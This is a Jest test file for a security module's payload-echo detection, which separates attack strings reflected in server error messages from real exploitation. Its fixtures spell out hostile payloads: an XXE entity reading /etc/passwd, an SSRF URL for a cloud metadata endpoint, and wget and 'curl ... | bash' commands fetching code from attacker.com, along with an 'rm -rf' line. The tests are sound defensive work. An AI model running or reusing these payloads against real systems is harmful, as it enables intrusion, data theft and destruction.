/**
 * Issue #201: Payload Echo Detection Tests
 *
 * Tests for false positive prevention when servers echo attack payloads
 * in error messages. The security module was flagging false positives because
 * regex patterns matched payload text echoed in errors, not actual exploitation.
 *
 * Example false positive:
 *   Payload: <?xml...><soap:Envelope...xxe SYSTEM...>
 *   Response: File not found: /path/to/<?xml...><soap:Envelope...xxe SYSTEM...>
 *   Regex: /(soap.*xxe)/i matches echoed payload, not XXE exploitation
 */

import {
  isPayloadPartiallyEchoed,
  isPayloadInErrorContext,
  hasErrorContext,
} from "../modules/securityTests/SecurityPatternLibrary";

describe("Issue #201: Payload Echo Detection", () => {
  describe("isPayloadPartiallyEchoed", () => {
    describe("XXE payloads echoed in file errors", () => {
      it("detects XXE SOAP payload echoed in file-not-found error", () => {
        const payload =
          '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>';
        const response =
          'File not found: /Users/test/audio/<?xml version="1.0"?><soap:Envelope...xxe SYSTEM...>';

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects XXE payload with truncated error message", () => {
        const payload =
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
        const response =
          'Error: Invalid file path: <?xml version="1.0"?><!DOCTYPE foo...';

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("SSRF/URL payloads echoed in errors", () => {
      it("detects URL payload echoed in file-not-found error", () => {
        const payload = "http://evil.com/inject.txt";
        const response =
          "File not found: /Users/test/http:/evil.com/inject.txt";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects internal URL payload echoed in error", () => {
        const payload = "http://169.254.169.254/latest/meta-data/";
        const response =
          "Error: Cannot access file http://169.254.169.254/latest/meta-data/";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("RCE/command payloads echoed in errors", () => {
      it("detects wget command echoed in file-not-found error", () => {
        const payload = "wget http://attacker.com/malware -O /tmp/x";
        const response =
          "File not found: /Users/test/wget http:/attacker.com/malware -O /tmp/x";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects curl command echoed in error", () => {
        const payload = "curl http://attacker.com/shell.sh | bash";
        const response =
          "Invalid path: curl http://attacker.com/shell.sh | bash";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("detects system command echoed in error", () => {
        const payload = "ls -la /etc/passwd";
        const response = "Error: file 'ls -la /etc/passwd' not found";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("exact match behavior (backward compatibility)", () => {
      it("detects exact payload match", () => {
        const payload = "test payload";
        const response = "Response contains test payload here";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });

      it("handles case insensitivity", () => {
        const payload = "SELECT * FROM users";
        const response = "Error: select * from users is not allowed";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("segment-based detection", () => {
      it("detects multiple segments of modified payload", () => {
        // When payload is split/escaped but segments are present
        const payload = "wget http://attacker.com/malware -O /tmp/malicious";
        const response =
          "Error: Could not process - invalid segments: wget, attacker, malware, malicious";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      });
    });

    describe("negative cases - should NOT detect echo", () => {
      it("returns false for completely different response", () => {
        const payload =
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
        const response = "Success: File loaded successfully";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });

      it("returns false for generic error without payload content", () => {
        const payload = "wget http://attacker.com/malware";
        const response = "Error: Operation not permitted";

        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });

      it("returns false when only coincidental short matches", () => {
        const payload = "rm -rf /important/data";
        const response = "The data was not found in the database";

        // "data" appears in both but that's coincidental, not echo
        expect(isPayloadPartiallyEchoed(response, payload)).toBe(false);
      });
    });
  });

  describe("isPayloadInErrorContext", () => {
    it("returns true for partial payload in error context", () => {
      const payload =
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
      const response =
        'Error: File not found: <?xml version="1.0"?><!DOCTYPE foo...truncated';

      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("returns true for URL payload in file-not-found error", () => {
      const payload = "http://evil.com/inject.txt";
      const response = "File not found: /path/http:/evil.com/inject.txt";

      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("returns false when no error context", () => {
      const payload = "test payload";
      const response = "Success: test payload was processed";

      // Has payload but no error context
      expect(isPayloadInErrorContext(response, payload)).toBe(false);
    });

    it("returns false when error context but no payload echo", () => {
      const payload = '<?xml version="1.0"?><!DOCTYPE foo>';
      const response = "Error: Invalid operation";

      // Has error context but payload not echoed
      expect(isPayloadInErrorContext(response, payload)).toBe(false);
    });
  });

  describe("hasErrorContext pattern coverage", () => {
    const errorPatterns = [
      "File not found: /path/to/file",
      "Error loading resource",
      "Could not find the specified file",
      "Permission denied",
      "Access denied",
      "404 not found",
      "Invalid path specified",
      "Operation failed",
      "Request rejected",
    ];

    errorPatterns.forEach((errorMessage) => {
      it(`detects error context: "${errorMessage.substring(0, 30)}..."`, () => {
        expect(hasErrorContext(errorMessage)).toBe(true);
      });
    });
  });

  describe("ElevenLabs Player audit false positive scenarios", () => {
    // These are the exact scenarios from Issue #201

    it("XXE in SOAP: File not found error should be detected as echo", () => {
      const payload =
        '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>';
      const response =
        'File not found: /Users/testuser/audio/<?xml version="1.0"?><soap:Envelope xmlns:soap="..."><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...';

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("Indirect Prompt Injection URL: File not found should be detected as echo", () => {
      const payload = "http://evil.com/inject.txt";
      const response =
        "File not found: /Users/testuser/audio/http:/evil.com/inject.txt";

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });

    it("Blacklist Bypass wget: File not found should be detected as echo", () => {
      const payload = "wget http://attacker.com/malware -O /tmp/x";
      const response =
        "File not found: /Users/testuser/audio/wget http:/attacker.com/malware -O /tmp/x";

      expect(isPayloadPartiallyEchoed(response, payload)).toBe(true);
      expect(hasErrorContext(response)).toBe(true);
      expect(isPayloadInErrorContext(response, payload)).toBe(true);
    });
  });
});
